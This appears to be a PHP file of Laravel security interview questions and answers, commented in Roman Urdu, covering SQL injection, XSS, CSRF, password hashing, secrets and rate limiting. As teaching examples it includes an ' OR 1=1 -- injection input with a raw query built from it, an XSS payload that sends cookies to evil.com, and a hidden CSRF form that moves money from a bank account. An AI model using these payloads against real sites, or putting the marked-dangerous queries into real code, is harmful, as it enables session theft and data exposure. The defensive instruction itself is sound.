<?php

/**
 * ============================================================================
 *                    SECURITY — INTERVIEW Q&A
 *                  (6 Years Experience Level)
 * ============================================================================
 */


// =============================================================================
// S1: Laravel mein kaunsi security features built-in hain?
// =============================================================================

/*
 * J: Laravel mein yeh security features PEHLE SE hain:
 *
 *   1) CSRF Protection       → Cross-Site Request Forgery rokta hai
 *   2) XSS Protection        → {{ }} Blade mein auto-escape
 *   3) SQL Injection Protection → Eloquent/Query Builder parameterized queries
 *   4) Mass Assignment Protection → $fillable / $guarded
 *   5) Password Hashing       → bcrypt / Argon2
 *   6) Encryption             → AES-256-CBC (encrypt/decrypt helpers)
 *   7) Rate Limiting          → Brute force attacks rokna
 *   8) CORS                   → Cross-Origin Resource Sharing control
 *   9) Session Security       → HttpOnly, Secure, SameSite cookies
 *  10) Signed URLs            → Tamper-proof URLs
 */


// =============================================================================
// S2: SQL Injection kya hai? Laravel kaise rokta hai?
// =============================================================================

/*
 * J: SQL Injection = Hacker SQL query mein apna code daalta hai.
 */

// ❌ KHATARNAAK — Raw query bina binding ke:
$email = $_GET['email']; // Hacker bhejega: ' OR 1=1 --
$users = DB::select("SELECT * FROM users WHERE email = '$email'");
// Query ban jaye gi: SELECT * FROM users WHERE email = '' OR 1=1 --'
// ↑ Sab users aa jayein ge! 💀

// ✅ MEHFOOZ — Parameterized query:
$users = DB::select("SELECT * FROM users WHERE email = ?", [$email]);

// ✅ MEHFOOZ — Eloquent (khud parameterize karta hai):
$users = User::where('email', $email)->get();

// ✅ MEHFOOZ — Query Builder:
$users = DB::table('users')->where('email', $email)->get();

// ⚠️ KHATRNAK JAGAHEIN jahan injection ho sakta hai:
DB::raw("ORDER BY $column");           // ❌ Raw column name
DB::select("WHERE status = '$val'");   // ❌ String interpolation

// ✅ Column whitelist karo:
$allowed = ['name', 'email', 'created_at'];
$column = in_array($request->sort, $allowed) ? $request->sort : 'created_at';
$users = User::orderBy($column)->get();


// =============================================================================
// S3: XSS (Cross-Site Scripting) kya hai? Kaise rokein?
// =============================================================================

/*
 * J: XSS = Hacker page mein JavaScript inject karta hai.
 */

// ❌ KHATARNAAK — Blade mein {!! !!} (unescaped):
// {!! $user->bio !!}
// Agar bio = "<script>document.location='evil.com?cookie='+document.cookie</script>"
// → User ki cookies chori ho jayein gi! 💀

// ✅ MEHFOOZ — Blade mein {{ }} (auto-escaped):
// {{ $user->bio }}
// <script> tags &lt;script&gt; mein badal jayein ge — execute nahi honge

/*
 * USOOL:
 *   ✅ Hamesha {{ }} use karo (escaped)
 *   ✅ {!! !!} SIRF tab jab aap ne khud HTML banaya ho
 *   ✅ User input KABHI {!! !!} mein mat daalo
 *   ✅ Content-Security-Policy header lagao
 *   ✅ htmlspecialchars() use karo agar manually output kar rahe
 */


// =============================================================================
// S4: CSRF Protection kaise kaam karta hai?
// =============================================================================

/*
 * J: CSRF = Cross-Site Request Forgery
 *    Hacker user ki taraf se bina uski marzi ke request bhejta hai.
 *
 *    Maslan: Hacker ki site par chhupa hua form:
 *    <form action="https://bank.com/transfer" method="POST">
 *        <input name="to" value="hacker">
 *        <input name="amount" value="10000">
 *    </form>
 *    <script>document.forms[0].submit();</script>
 *    ↑ User ka browser bank mein logged in hai toh paise transfer ho jayein ge!
 *
 *    LARAVEL KA HAL:
 *    - Har form ke sath ek SECRET TOKEN bhejta hai
 *    - Server check karta hai token sahi hai ya nahi
 *    - Hacker ko token nahi pata toh request REJECT
 *
 *    Blade mein:
 *    <form method="POST">
 *        @csrf               ← Yeh hidden input daalta hai CSRF token ke sath
 *        ...
 *    </form>
 *
 *    API mein CSRF nahi lagta (stateless — token-based auth hoti hai)
 *    api middleware group mein VerifyCsrfToken nahi hota
 */


// =============================================================================
// S5: Sensitive data kaise handle karein?
// =============================================================================

/*
 * J:
 *   1) PASSWORDS — Hamesha hash karo:
 */
$user->password = Hash::make($request->password);  // bcrypt
// KABHI plain text mein mat rakhho!
// KABHI encrypt() mat use karo passwords ke liye (reversible hai!)

/*
 *   2) API KEYS / SECRETS — .env mein rakhho:
 */
// ❌ config/services.php mein:
// 'stripe_key' => 'sk_live_abc123'      // ❌ KABHI code mein mat likhho

// ✅ .env mein:
// STRIPE_KEY=sk_live_abc123
// config/services.php: 'stripe_key' => env('STRIPE_KEY')

/*
 *   3) ENCRYPTION — Sensitive data encrypt karo:
 */
$encrypted = encrypt($user->ssn);         // Encrypt karo (AES-256-CBC)
$decrypted = decrypt($encrypted);         // Decrypt karo

// Model mein automatic encryption:
class Patient extends Model
{
    protected function casts(): array
    {
        return [
            'ssn' => 'encrypted',             // Khud encrypt/decrypt karega
            'medical_notes' => 'encrypted:array',
        ];
    }
}

/*
 *   4) LOGGING — Sensitive data log mat karo:
 *      ❌ Log::info('Login', ['password' => $request->password]);
 *      ✅ Log::info('Login', ['email' => $request->email]);
 *
 *   5) GIT — .env KABHI git mein mat daalo:
 *      .gitignore mein .env hona chahiye
 */


// =============================================================================
// S6: Rate Limiting aur Brute Force se kaise bachein?
// =============================================================================

// Login attempts limit:
RateLimiter::for('login', function (Request $request) {
    return [
        Limit::perMinute(5)->by($request->ip()),                    // 5 per IP
        Limit::perMinute(10)->by($request->input('email')),         // 10 per email
    ];
});

// Account lockout after failed attempts:
class LoginController extends Controller
{
    public function login(Request $request)
    {
        $key = 'login-attempts:' . $request->ip();

        if (RateLimiter::tooManyAttempts($key, 5)) {
            $seconds = RateLimiter::availableIn($key);
            return response()->json([
                'message' => "Bohot zyada koshishen. {$seconds} seconds baad try karein."
            ], 429);
        }

        if (Auth::attempt($request->only('email', 'password'))) {
            RateLimiter::clear($key);
            return response()->json(['message' => 'Login successful']);
        }

        RateLimiter::hit($key, 300); // 5 minute lockout
        return response()->json(['message' => 'Invalid credentials'], 401);
    }
}
